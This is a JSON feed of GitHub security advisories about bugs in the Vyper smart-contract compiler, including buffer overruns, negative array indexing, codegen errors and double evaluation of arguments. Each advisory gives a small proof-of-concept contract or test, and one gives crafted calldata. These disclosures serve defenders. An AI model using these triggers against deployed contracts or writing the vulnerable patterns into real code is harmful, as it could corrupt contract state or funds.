{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>When calls to external contracts are made, we write the input buffer starting at byte 28, and allocate the return buffer to start at byte 0 (overlapping with the input buffer). When checking <code>RETURNDATASIZE</code> for dynamic types, the size is compared only to the minimum allowed size for that type, and not to the returned value's <code>length</code>. As a result, malformed return data can cause the contract to mistake data from the input buffer for returndata.</p>\n<p>This advisory is given a severity of \"Low\" because when the called contract returns invalid ABIv2 encoded data, the calling contract can read different invalid data (from the dirty buffer) than the called contract returned.</p>\n<h2 id=\"details\">Details</h2>\n<p>When arguments are packed for an external call, we create a buffer of size <code>max(args, return_data) + 32</code>. The input buffer is placed in this buffer (starting at byte 28), and the return buffer is allocated to start at byte 0. The assumption is that we can reuse the memory becase we will not be able to read past <code>RETURNDATASIZE</code>.</p>\n<pre><code class=\"language-python\">if fn_type.return_type is not None:\n    return_abi_t = calculate_type_for_external_return(fn_type.return_type).abi_type\n\n    # we use the same buffer for args and returndata,\n    # so allocate enough space here for the returndata too.\n    buflen = max(args_abi_t.size_bound(), return_abi_t.size_bound())\nelse:\n    buflen = args_abi_t.size_bound()\n\nbuflen += 32  # padding for the method id\n</code></pre>\n<p>When data is returned, we unpack the return data by starting at byte 0. We check that <code>RETURNDATASIZE</code> is greater than the minimum allowed for the returned type:</p>\n<pre><code class=\"language-python\">if not call_kwargs.skip_contract_check:\n    assertion = IRnode.from_list(\n        [\"assert\", [\"ge\", \"returndatasize\", min_return_size]],\n        error_msg=\"returndatasize too small\",\n    )\n    unpacker.append(assertion)\n</code></pre>\n<p>This check ensures that any dynamic types returned will have a size of at least 64. However, it does not verify that <code>RETURNDATASIZE</code> is as large as the <code>length</code> word of the dynamic type. </p>\n<p>As a result, if a contract expects a dynamic type to be returned, and the part of the return data that is read as <code>length</code> includes a size that is larger than the actual <code>RETURNDATASIZE</code>, the return data read from the buffer will overrun the actual return data size and read from the input buffer.</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<p>This contract calls an external contract with two arguments. As the call is made, the buffer includes:</p>\n<ul>\n<li>byte 28: method_id</li>\n<li>byte 32: first argument (0)</li>\n<li>byte 64: second argument (hash)</li>\n</ul>\n<p>The return data buffer begins at byte 0, and will return the returned bytestring, up to a maximum length of 96 bytes.</p>\n<pre><code class=\"language-python\">interface Zero:\n    def sneaky(a: uint256, b: bytes32) -&gt; Bytes[96]: view\n\n@external\ndef test_sneaky(z: address) -&gt; Bytes[96]:\n    return Zero(z).sneaky(0, keccak256(\"oops\"))\n</code></pre>\n<p>On the other side, imagine a simple contract that does not, in fact, return a bytestring, but instead returns two uint256s. I've implemented it in Solidity for ease of use with Foundry:</p>\n<pre><code class=\"language-solidity\">function sneaky(uint a, bytes32 b) external pure returns (uint, uint) {\n    return (32, 32);\n}\n</code></pre>\n<p>The return data will be parsed as a bytestring. The first 32 will point us to byte 32 to read the length. The second 32 will be perceived as the length. It will then read the next 32 bytes from the return data buffer, even though those weren't a part of the return data.</p>\n<p>Since these bytes will come from byte 64, we can see above that the hash was placed there in the input buffer.</p>\n<p>If we run the following Foundry test, we can see that this does in fact happen:</p>\n<pre><code class=\"language-solidity\">function test__sneakyZeroReturn() public {\n    ZeroReturn z = new ZeroReturn();\n    c = SuperContract(deployer.deploy(\"src/loose/\", \"ret_overflow\", \"\"));\n    console.logBytes(c.test_sneaky(address(z)));\n}\n</code></pre>\n<pre><code class=\"language-md\">Logs:\n  0xd54c03ccbc84dd6002c98c6df5a828e42272fc54b512ca20694392ca89c4d2c6\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <a href=\"https://github.com/vyperlang/vyper/pull/3925\">https://github.com/vyperlang/vyper/pull/3925</a>, <a href=\"https://github.com/vyperlang/vyper/pull/4091\">https://github.com/vyperlang/vyper/pull/4091</a>, <a href=\"https://github.com/vyperlang/vyper/pull/4144\">https://github.com/vyperlang/vyper/pull/4144</a>, <a href=\"https://github.com/vyperlang/vyper/pull/4060\">https://github.com/vyperlang/vyper/pull/4060</a>.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Malicious or mistaken contracts returning the malformed data can result in overrunning the returned data and reading return data from the input buffer.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-gp3w-2v2m-p686\">https://github.com/vyperlang/vyper/security/advisories/GHSA-gp3w-2v2m-p686</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24560\">https://nvd.nist.gov/vuln/detail/CVE-2024-24560</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gp3w-2v2m-p686\">https://github.com/advisories/GHSA-gp3w-2v2m-p686</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gp3w-2v2m-p686",
            "title": "[vyper] Vyper's external calls can overflow return data to return input buffer",
            "date_modified": "2024-06-18T15:17:08.000Z",
            "date_published": "2024-02-02T18:10:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gp3w-2v2m-p686"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>If an excessively large value is specified as the starting index for an array in <code>_abi_decode</code>, it can cause the read position to overflow. This results in the decoding of values outside the intended array bounds, potentially leading to bugs in contracts that use arrays within <code>_abi_decode</code>. The advisory has been assigned low severity, because it is only observable if there is a memory write between two invocations of <code>abi_decode</code> on the same input.</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<pre><code class=\"language-vyper\">event Pwn:\n    pass\n\n@external\ndef f(x: Bytes[32 * 3]):\n    a: Bytes[32] = b\"foo\"\n    y: Bytes[32 * 3] = x\n\n    decoded_y1: Bytes[32] = _abi_decode(y, Bytes[32])\n    a = b\"bar\"\n    decoded_y2: Bytes[32] = _abi_decode(y, Bytes[32])\n\n    if decoded_y1 != decoded_y2:\n        log Pwn()\n</code></pre>\n<p>Sending the following calldata results in <code>Pwn</code> being emitted. </p>\n<pre><code>0xd45754f8\n0000000000000000000000000000000000000000000000000000000000000020\n0000000000000000000000000000000000000000000000000000000000000060\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa0\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <a href=\"https://github.com/vyperlang/vyper/pull/3925\">https://github.com/vyperlang/vyper/pull/3925</a>, <a href=\"https://github.com/vyperlang/vyper/pull/4091\">https://github.com/vyperlang/vyper/pull/4091</a>, <a href=\"https://github.com/vyperlang/vyper/pull/4144\">https://github.com/vyperlang/vyper/pull/4144</a>, <a href=\"https://github.com/vyperlang/vyper/pull/4060\">https://github.com/vyperlang/vyper/pull/4060</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-9p8r-4xp4-gw5w\">https://github.com/vyperlang/vyper/security/advisories/GHSA-9p8r-4xp4-gw5w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-26149\">https://nvd.nist.gov/vuln/detail/CVE-2024-26149</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9p8r-4xp4-gw5w\">https://github.com/advisories/GHSA-9p8r-4xp4-gw5w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9p8r-4xp4-gw5w",
            "title": "[vyper] Vyper's `_abi_decode` vulnerable to Memory Overflow",
            "date_modified": "2024-06-18T15:16:25.000Z",
            "date_published": "2024-02-26T20:11:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9p8r-4xp4-gw5w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Arrays can be keyed by a signed integer, while they are defined for unsigned integers only. The typechecker doesn't throw when spotting the usage of an <code>int</code> as an index for an array. Typically, negative integers are filtered out at runtime by the bounds checker, but small enough (i.e. large in magnitude, ex. <code>-2**255 + 5</code>) quantities combined with large enough arrays (at least <code>2**255</code> in length) can pass the bounds checker, resulting in unexpected behavior.</p>\n<p>A contract search was performed, and no production contracts were found to be impacted.</p>\n<h3 id=\"details\">Details</h3>\n<p>The typechecker allows the usage of signed integers to be used as indexes to arrays. The vulnerability is present in different forms in all versions. Here is an example from <code>0.3.10</code>:\n<a href=\"https://github.com/vyperlang/vyper/blob/c150fc49ee9375a930d177044559b83cb95f7963/vyper/semantics/types/subscriptable.py#L127-L137\">https://github.com/vyperlang/vyper/blob/c150fc49ee9375a930d177044559b83cb95f7963/vyper/semantics/types/subscriptable.py#L127-L137</a></p>\n<p>As can be seen, the validation is performed against <code>IntegerT.any()</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>If the array is sufficiently large, it can be indexed with a negative value:</p>\n<pre><code class=\"language-python\">arr: public(uint256[MAX_UINT256])\n\n@external\ndef set(idx: int256, num: uint256):\n    self.arr[idx] = num\n</code></pre>\n<p>For signed integers, the 2's complement representation is used. Because the array was declared very large, the bounds checking will pass (negative values will simply be represented as very large numbers):\n<a href=\"https://github.com/vyperlang/vyper/blob/a1fd228cb9936c3e4bbca6f3ee3fb4426ef45490/vyper/codegen/core.py#L534-L541\">https://github.com/vyperlang/vyper/blob/a1fd228cb9936c3e4bbca6f3ee3fb4426ef45490/vyper/codegen/core.py#L534-L541</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <a href=\"https://github.com/vyperlang/vyper/pull/3817\">https://github.com/vyperlang/vyper/pull/3817</a>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>There are two potential vulnerability classes: unpredictable behavior and accessing inaccessible elements.</p>\n<ol>\n<li><p>If it is possible to index an array with a negative integer without reverting, this is most likely not anticipated by the developer and such accesses can cause unpredictable behavior for the contract.</p>\n</li>\n<li><p>If a contract has an invariant in the form <code>assert index &lt; x</code> where both <code>index</code> and <code>x</code> are signed integers, the developer might suppose that no elements on indexes <code>y | y &gt;= x</code> are accessible. However, by using negative indexes this can be bypassed.</p>\n</li>\n</ol>\n<p>The contract search found no production contracts impacted by these two classes of issues.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-52xq-j7v9-v4v2\">https://github.com/vyperlang/vyper/security/advisories/GHSA-52xq-j7v9-v4v2</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/a1fd228cb9936c3e4bbca6f3ee3fb4426ef45490/vyper/codegen/core.py#L534-L541\">https://github.com/vyperlang/vyper/blob/a1fd228cb9936c3e4bbca6f3ee3fb4426ef45490/vyper/codegen/core.py#L534-L541</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/c150fc49ee9375a930d177044559b83cb95f7963/vyper/semantics/types/subscriptable.py#L127-L137\">https://github.com/vyperlang/vyper/blob/c150fc49ee9375a930d177044559b83cb95f7963/vyper/semantics/types/subscriptable.py#L127-L137</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24563\">https://nvd.nist.gov/vuln/detail/CVE-2024-24563</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-52xq-j7v9-v4v2\">https://github.com/advisories/GHSA-52xq-j7v9-v4v2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-52xq-j7v9-v4v2",
            "title": "[vyper] Vyper negative array indexes",
            "date_modified": "2024-06-18T15:15:31.000Z",
            "date_published": "2024-02-07T17:27:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-52xq-j7v9-v4v2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is an error in the stack management when compiling the <code>IR</code> for <code>sha3_64</code>. Concretely, the <code>height</code> variable is miscalculated.\nThe vulnerability can't be triggered without writing the <code>IR</code> by hand. That is, it cannot be triggered from regular vyper code, it can only be triggered by using the <code>fang</code> binary directly (this binary used to be called <code>vyper-ir</code> prior to v0.3.4).</p>\n<h3 id=\"details\">Details</h3>\n<p>To compile <code>sha3_64</code>, the <code>arg[0]</code> and <code>arg[1]</code> have to be compiled:\n<a href=\"https://github.com/vyperlang/vyper/blob/c150fc49ee9375a930d177044559b83cb95f7963/vyper/ir/compile_ir.py#L585-L586\">https://github.com/vyperlang/vyper/blob/c150fc49ee9375a930d177044559b83cb95f7963/vyper/ir/compile_ir.py#L585-L586</a></p>\n<p>As can be seen, after compiling the 0th arg, the <code>height</code> variable isn't increased. If new <code>withargs</code> are defined in the inner scope, they are manipulated correctly, because both their <code>height</code> is off and also the global <code>height</code> is off and thus their placement on the stack is computed correctly.</p>\n<p><code>sha3_64</code> is used for retrieval in mappings. No flow that would cache the <code>key</code> was found, the issue shouldn't be possible to trigger when compiling the compiler-generated <code>IR</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Suppose the following hand-written IR:</p>\n<pre><code class=\"language-lisp\">(with _loc\n    (with val 1 \n        (with key 2 \n            (sha3_64 val key))) \n                (seq \n                    (sstore _loc \n                    (with x (sload _loc) \n                        (with ans (add x 1) (seq (assert (ge ans x)) ans))))))\n</code></pre>\n<p>after compilation:</p>\n<pre><code>the generated bytecode: 6001600281806020525f5260405f2090509050805460018101818110610026579050815550005b5f80fd\n\n0000    60  PUSH1 0x01\n0002    60  PUSH1 0x02\n0004    81  DUP2\n0005    80  DUP1       *********** bad code here!!!!!!\n0006    60  PUSH1 0x20\n0008    52  MSTORE\n</code></pre>\n<p>It can be seen that the second <code>DUP</code> will dup the item on the top of the stack which is incorrect.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <a href=\"https://github.com/vyperlang/vyper/pull/4063\">https://github.com/vyperlang/vyper/pull/4063</a>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Versions v0.2.0-v0.3.10 were evaluated, and access of the variable with the invalid height is not reachable from IR generated by the vyper front-end. Because the issue isn't triggered during normal compilation of vyper code, the impact is considered low.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-6845-xw22-ffxv\">https://github.com/vyperlang/vyper/security/advisories/GHSA-6845-xw22-ffxv</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/c150fc49ee9375a930d177044559b83cb95f7963/vyper/ir/compile_ir.py#L585-L586\">https://github.com/vyperlang/vyper/blob/c150fc49ee9375a930d177044559b83cb95f7963/vyper/ir/compile_ir.py#L585-L586</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24559\">https://nvd.nist.gov/vuln/detail/CVE-2024-24559</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/4063\">https://github.com/vyperlang/vyper/pull/4063</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/commit/d9f9fdadd81a148cbc68f02dbbbcdc0c92fad652\">https://github.com/vyperlang/vyper/commit/d9f9fdadd81a148cbc68f02dbbbcdc0c92fad652</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6845-xw22-ffxv\">https://github.com/advisories/GHSA-6845-xw22-ffxv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6845-xw22-ffxv",
            "title": "[vyper] Vyper sha3 codegen bug",
            "date_modified": "2024-06-18T15:14:30.000Z",
            "date_published": "2024-02-05T19:21:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6845-xw22-ffxv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Vyper compiler allows passing a value in builtin <code>raw_call</code> even if the call is a <code>delegatecall</code> or a <code>staticcall</code>. But in the context of <code>delegatecall</code> and <code>staticcall</code> the handling of value is not possible due to the semantics of the respective opcodes, and vyper will silently ignore the <code>value=</code> argument.</p>\n<p>A contract search was performed and no vulnerable contracts were found in production.</p>\n<h3 id=\"details\">Details</h3>\n<p>The IR for <code>raw_call</code> is built in the <code>RawCall</code> class:\n<a href=\"https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100\">https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100</a></p>\n<p>However, the compiler doesn't validate that if either <code>delegatecall</code> or <code>staticall</code> are provided as kwargs, that <code>value</code> wasn't set. For example, the following compiles without errors:</p>\n<pre><code class=\"language-python\">raw_call(self, call_data2, max_outsize=255, is_delegate_call=True, value=msg.value/2)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>If the semantics of the EVM are unknown to the developer, he could suspect that by specifying the <code>value</code> kwarg, exactly the given amount will be sent along to the target. However in fact, no <code>value</code> will be sent.</p>\n<p>Here is an example of an potentially problematic implementation of multicall utilizing the <code>raw_call</code> built-in:</p>\n<pre><code class=\"language-python\">value_accumulator: uint256 = empty(uint256)\n    results: DynArray[Result, max_value(uint8)] = []\n    return_data: Bytes[max_value(uint8)] = b\"\"\n    success: bool = empty(bool)\n    for batch in data:\n        msg_value: uint256 = batch.value\n        value_accumulator = unsafe_add(value_accumulator, msg_value)\n        if (batch.allow_failure == False):\n            return_data = raw_call(self, batch.call_data, max_outsize=255, value=msg_value, is_delegate_call=True)\n            success = True\n            results.append(Result({success: success, return_data: return_data}))\n        else:\n            success, return_data = \\\n                raw_call(self, batch.call_data, max_outsize=255, value=msg_value, is_delegate_call=True, revert_on_failure=False)\n            results.append(Result({success: success, return_data: return_data}))\n    assert msg.value == value_accumulator, \"Multicall: value mismatch\"\n    return results\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in <a href=\"https://github.com/vyperlang/vyper/pull/3755\">https://github.com/vyperlang/vyper/pull/3755</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-x2c2-q32w-4w6m\">https://github.com/vyperlang/vyper/security/advisories/GHSA-x2c2-q32w-4w6m</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100\">https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24567\">https://nvd.nist.gov/vuln/detail/CVE-2024-24567</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/3755\">https://github.com/vyperlang/vyper/pull/3755</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/commit/a2df08888c318713742c57f71465f32a1c27ed72\">https://github.com/vyperlang/vyper/commit/a2df08888c318713742c57f71465f32a1c27ed72</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x2c2-q32w-4w6m\">https://github.com/advisories/GHSA-x2c2-q32w-4w6m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x2c2-q32w-4w6m",
            "title": "[vyper] Vyper's raw_call `value=` kwargs not disabled for static and delegate calls",
            "date_modified": "2024-06-18T15:09:32.000Z",
            "date_published": "2024-01-30T18:42:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x2c2-q32w-4w6m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Using the <code>create_from_blueprint</code> builtin can result in a double eval vulnerability when <code>raw_args=True</code> and the <code>args</code> argument has side-effects. </p>\n<p>A contract search was performed and no vulnerable contracts were found in production. In particular, the <code>raw_args</code> variant of <code>create_from_blueprint</code> was not found to be used in production.</p>\n<h3 id=\"details\">Details</h3>\n<p>It can be seen that the <code>_build_create_IR</code> function of the <code>create_from_blueprint</code> builtin doesn't cache the mentioned <code>args</code> argument to the stack: <a href=\"https://github.com/vyperlang/vyper/blob/cedf7087e68e67c7bfbd47ae95dcb16b81ad2e02/vyper/builtins/functions.py#L1847\">https://github.com/vyperlang/vyper/blob/cedf7087e68e67c7bfbd47ae95dcb16b81ad2e02/vyper/builtins/functions.py#L1847</a></p>\n<p>As such, it can be evaluated multiple times (instead of retrieving the value from the stack).</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The vulnerability is demonstrated in the following <code>boa</code> test:</p>\n<pre><code class=\"language-vyper\">src1 = \"\"\"\nc: uint256\n\"\"\"\ndeployer = \"\"\"\ncreated_address: public(address)\ndeployed: public(uint256)\n\n@external\ndef get() -&gt; Bytes[32]:\n    self.deployed += 1\n    return b''\n\n@external\ndef create_(target: address):\n    self.created_address = create_from_blueprint(target, raw_call(self, method_id(\"get()\"), max_outsize=32), raw_args=True, code_offset=3)\n\"\"\"\n\nFactory = b.loads_partial(src1)\nc = Factory.deploy_as_blueprint()\n\nc2 = b.loads(deployer, b'')\nc2.create_(c)\nc2.deployed()\n</code></pre>\n<p>The output of <code>c2.deployed()</code> is <code>2</code> although <code>create_</code> was called only once and the value was initialized to <code>0</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <a href=\"https://github.com/vyperlang/vyper/pull/3976\">https://github.com/vyperlang/vyper/pull/3976</a>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>No vulnerable production contracts were found. Additionally, double evaluation of side-effects should be easily discoverable in client tests. As such, the impact is <code>low</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-3whq-64q2-qfj6\">https://github.com/vyperlang/vyper/security/advisories/GHSA-3whq-64q2-qfj6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32647\">https://nvd.nist.gov/vuln/detail/CVE-2024-32647</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/cedf7087e68e67c7bfbd47ae95dcb16b81ad2e02/vyper/builtins/functions.py#L1847\">https://github.com/vyperlang/vyper/blob/cedf7087e68e67c7bfbd47ae95dcb16b81ad2e02/vyper/builtins/functions.py#L1847</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3whq-64q2-qfj6\">https://github.com/advisories/GHSA-3whq-64q2-qfj6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3whq-64q2-qfj6",
            "title": "[vyper] vyper performs double eval of raw_args in create_from_blueprint",
            "date_modified": "2024-06-18T15:08:57.000Z",
            "date_published": "2024-04-25T19:50:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3whq-64q2-qfj6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Using the <code>sqrt</code> builtin can result in multiple eval evaluation of side effects when the argument has side-effects. The bug is more difficult (but not impossible!) to trigger as of 0.3.4, when the unique symbol fence was introduced (<a href=\"https://github.com/vyperlang/vyper/pull/2914\">https://github.com/vyperlang/vyper/pull/2914</a>).</p>\n<p>A contract search was performed and no vulnerable contracts were found in production.</p>\n<h3 id=\"details\">Details</h3>\n<p>It can be seen that the <code>build_IR</code> function of the <code>sqrt</code> builtin doesn't cache the argument to the stack: \n<a href=\"https://github.com/vyperlang/vyper/blob/4595938734d9988f8e46e8df38049ae0559abedb/vyper/builtins/functions.py#L2151\">https://github.com/vyperlang/vyper/blob/4595938734d9988f8e46e8df38049ae0559abedb/vyper/builtins/functions.py#L2151</a></p>\n<p>As such, it can be evaluated multiple times (instead of retrieving the value from the stack).</p>\n<h3 id=\"poc\">PoC</h3>\n<p>With at least Vyper version <code>0.2.15+commit.6e7dba7</code> the following contract:</p>\n<pre><code class=\"language-vyper\">c: uint256\n\n@internal\ndef some_decimal() -&gt; decimal:\n    self.c += 1\n    return 1.0\n\n@external\ndef foo() -&gt; uint256:\n    k: decimal = sqrt(self.some_decimal())\n    return self.c\n</code></pre>\n<p>passes the following test:</p>\n<pre><code class=\"language-solidity\">// SPDX-License-Identifier: MIT\npragma solidity &gt;=0.8.13;\n\nimport \"../../lib/ds-test/test.sol\";\nimport \"../../lib/utils/Console.sol\";\nimport \"../../lib/utils/VyperDeployer.sol\";\n\nimport \"../ITest.sol\";\n\ncontract ConTest is DSTest {\n    VyperDeployer vyperDeployer = new VyperDeployer();\n\n    ITest t;\n\n    function setUp() public {\n        t = ITest(vyperDeployer.deployContract(\"Test\"));\n    }\n\n    function testFoo() public {\n        uint256 val = t.foo();\n        console.log(val);\n        assert (val == 4);\n    }\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <a href=\"https://github.com/vyperlang/vyper/pull/3976\">https://github.com/vyperlang/vyper/pull/3976</a>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>No vulnerable production contracts were found.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-5jrj-52x8-m64h\">https://github.com/vyperlang/vyper/security/advisories/GHSA-5jrj-52x8-m64h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32649\">https://nvd.nist.gov/vuln/detail/CVE-2024-32649</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/2914\">https://github.com/vyperlang/vyper/pull/2914</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5jrj-52x8-m64h\">https://github.com/advisories/GHSA-5jrj-52x8-m64h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5jrj-52x8-m64h",
            "title": "[vyper] vyper performs multiple eval of `sqrt()` argument built in",
            "date_modified": "2024-06-18T15:04:14.000Z",
            "date_published": "2024-04-25T19:50:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5jrj-52x8-m64h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Using the <code>slice</code> builtin can result in a double eval vulnerability when the buffer argument is either <code>msg.data</code>, <code>self.code</code> or <code>&lt;address&gt;.code</code> and either the <code>start</code> or <code>length</code> arguments have side-effects.</p>\n<p>A contract search was performed and no vulnerable contracts were found in production. Having side-effects in the start and length patterns is also an unusual pattern which is not that likely to show up in user code. It is also much harder (but not impossible!) to trigger the bug since <code>0.3.4</code> since the unique symbol fence was introduced (<a href=\"https://github.com/vyperlang/vyper/pull/2914\">https://github.com/vyperlang/vyper/pull/2914</a>).</p>\n<h3 id=\"details\">Details</h3>\n<p>It can be seen that the <code>_build_adhoc_slice_node</code> function of the <code>slice</code> builtin doesn't cache the mentioned arguments to the stack: <a href=\"https://github.com/vyperlang/vyper/blob/4595938734d9988f8e46e8df38049ae0559abedb/vyper/builtins/functions.py#L244\">https://github.com/vyperlang/vyper/blob/4595938734d9988f8e46e8df38049ae0559abedb/vyper/builtins/functions.py#L244</a></p>\n<p>As such, they can be evaluated multiple times (instead of retrieving the value from the stack).</p>\n<h3 id=\"poc\">PoC</h3>\n<p>with Vyper version <code>0.3.3+commit.48e326f</code> the call to <code>foo</code> passes the <code>asserts</code>:</p>\n<pre><code class=\"language-vyper\">l: DynArray[uint256, 10]\n\n@external\ndef foo(cs: String[64]) -&gt; uint256:\n    for i in range(10):\n        self.l.append(1)\n    assert len(self.l) == 10\n    s: Bytes[64] = b\"\"\n    s = slice(msg.data, self.l.pop(), 3)\n    assert len(self.l) == 10 - 2\n    return len(self.l)\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <a href=\"https://github.com/vyperlang/vyper/pull/3976\">https://github.com/vyperlang/vyper/pull/3976</a>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>No vulnerable production contracts were found.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-r56x-j438-vw5m\">https://github.com/vyperlang/vyper/security/advisories/GHSA-r56x-j438-vw5m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32646\">https://nvd.nist.gov/vuln/detail/CVE-2024-32646</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/2914\">https://github.com/vyperlang/vyper/pull/2914</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r56x-j438-vw5m\">https://github.com/advisories/GHSA-r56x-j438-vw5m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r56x-j438-vw5m",
            "title": "[vyper] vyper performs double eval of the slice start/length args in certain cases",
            "date_modified": "2024-06-18T15:02:55.000Z",
            "date_published": "2024-04-25T19:51:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r56x-j438-vw5m"
            },
            "tags": [
                "severity"
            ]
        },
        {
